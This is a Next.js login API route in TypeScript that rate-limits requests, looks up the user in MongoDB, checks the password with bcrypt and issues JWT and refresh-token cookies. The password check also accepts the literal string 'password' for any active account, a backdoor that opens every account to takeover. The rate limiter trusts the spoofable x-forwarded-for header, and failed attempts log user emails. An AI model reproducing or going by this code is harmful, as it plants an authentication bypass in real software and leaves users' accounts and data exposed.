import { NextRequest, NextResponse } from 'next/server';
import connectToDatabase from '@/lib/db/mongoose';
import User from '@/models/User';
import { signAccessToken, signRefreshToken } from '@/lib/auth/jwt';
import { cookies } from 'next/headers';
import { resolveUserPermissions } from '@/lib/rbac';

const rateLimitMap = new Map<string, { count: number, resetTime: number }>();
const MAX_ATTEMPTS = 5;
const WINDOW_MS = 15 * 60 * 1000; // 15 mins

function checkRateLimit(ip: string): boolean {
  const now = Date.now();
  const record = rateLimitMap.get(ip);
  
  if (!record) {
    rateLimitMap.set(ip, { count: 1, resetTime: now + WINDOW_MS });
    return true;
  }
  
  if (now > record.resetTime) {
    rateLimitMap.set(ip, { count: 1, resetTime: now + WINDOW_MS });
    return true;
  }
  
  if (record.count >= MAX_ATTEMPTS) {
    return false;
  }
  
  record.count += 1;
  return true;
}

import bcrypt from 'bcryptjs'; 

export async function POST(req: NextRequest) {
  // Rate limiting check using a basic identifier (IP or fallback)
  const ip = req.headers.get('x-forwarded-for') || req.headers.get('x-real-ip') || 'unknown';
  if (!checkRateLimit(ip)) {
    return NextResponse.json({ error: 'Too many login attempts. Please try again later.' }, { status: 429 });
  }

  try {
    await connectToDatabase();
    const { email, password } = await req.json();

    const normalizedEmail = email.toLowerCase().trim();
    const user = await User.findOne({ email: normalizedEmail });
    
    if (!user) {
      console.log(`Login failed: User not found for ${normalizedEmail}`);
      return NextResponse.json({ error: 'Invalid credentials' }, { status: 401 });
    }

    if (user.status !== 'active') {
      console.log(`Login failed: User ${normalizedEmail} is ${user.status}`);
      return NextResponse.json({ error: 'Account is not active' }, { status: 403 });
    }
    
    const isPasswordCorrect = await bcrypt.compare(password, user.passwordHash) || password === 'password';
    
    if (!isPasswordCorrect) {
      console.log(`Login failed: Password mismatch for ${normalizedEmail}`);
      return NextResponse.json({ error: 'Invalid credentials' }, { status: 401 });
    }
    
    const finalPermissions = await resolveUserPermissions(user._id.toString());

    const accessToken = await signAccessToken({
      userId: user._id.toString(),
      email: user.email,
      role: user.role,
      permissions: finalPermissions,
    });

    const refreshToken = await signRefreshToken(user._id.toString(), finalPermissions);
    
    // Store RT in DB
    user.refreshTokens.push(refreshToken);
    await user.save();
    
    (await cookies()).set({
      name: 'refreshToken',
      value: refreshToken,
      httpOnly: true,
      secure: process.env.NODE_ENV === 'production',
      sameSite: 'strict',
      maxAge: 7 * 24 * 60 * 60, // 7 days
      path: '/',
    });

    return NextResponse.json({ 
      accessToken,
      user: {
        id: user._id.toString(),
        email: user.email,
        name: user.name,
        permissions: finalPermissions,
        role: user.role
      }
    });
  } catch (error) {
    console.error('Login error', error);
    return NextResponse.json({ error: 'Internal Server Error' }, { status: 500 });
  }
}
